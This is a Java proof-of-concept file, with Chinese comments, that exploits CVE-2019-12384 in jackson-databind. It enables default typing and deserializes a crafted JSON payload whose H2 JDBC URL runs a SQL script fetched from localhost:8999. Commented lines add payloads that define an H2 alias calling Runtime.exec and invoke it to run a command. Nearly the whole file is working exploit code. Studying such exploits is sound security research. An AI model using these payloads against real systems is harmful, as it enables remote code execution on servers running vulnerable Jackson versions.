package com.dem0.cve;

import com.fasterxml.jackson.databind.ObjectMapper;

import java.io.IOException;

public class CVE_2019_12384 {
    //h2 rce

    /**
     * 修复方式就是添加黑名单类...
     * https://github.com/FasterXML/jackson-databind/compare/jackson-databind-2.9.9.1...jackson-databind-2.9.9.2（对应CVE-2019-14379、CVE-2019-14361）
     * @param args
     * @throws IOException
     * @throws IOException
     */
    public static void main(String[] args) throws IOException, IOException {
        ObjectMapper objectMapper = new ObjectMapper();
        objectMapper.enableDefaultTyping();//开启 defaultTyping
//        String json = " [\"ch.qos.logback.core.db.DriverManagerConnectionSource\", {\"url\":\"jdbc:h2:file:~/.h2/test;TRACE_LEVEL_SYSTEM_OUT=3;INIT=CALL SHELLEXEC('calc');\"}]";
        String json = "[\"ch.qos.logback.core.db.DriverManagerConnectionSource\", "+"{\"url\":\"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://localhost:8999/inject.sql'\"}]";
        Object o = objectMapper.readValue(json, Object.class);//反序列化对象
        String s = objectMapper.writeValueAsString(o);//

        //"[\"ch.qos.logback.core.db.DriverManagerConnectionSource\", "+"{\"url\":\"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://localhost:8999/inject.sql'\"}]";

        //    ["ch.qos.logback.core.db.DriverManagerConnectionSource", {"url":"jdbc:h2:file:~/.h2/test;TRACE_LEVEL_SYSTEM_OUT=3;INIT=CREATE ALIAS SHELLEXEC AS $$ void shellexec(String cmd) throws java.io.IOException { Runtime.getRuntime().exec(cmd)\\; }$$;"}]
        //同样使用文件存储模式，执行 CALL 命令调用函数 这样就省去了再去调用远程文件的问题
        //    ["ch.qos.logback.core.db.DriverManagerConnectionSource", {"url":"jdbc:h2:file:~/.h2/test;TRACE_LEVEL_SYSTEM_OUT=3;INIT=CALL SHELLEXEC('calc');"}]

    }
}
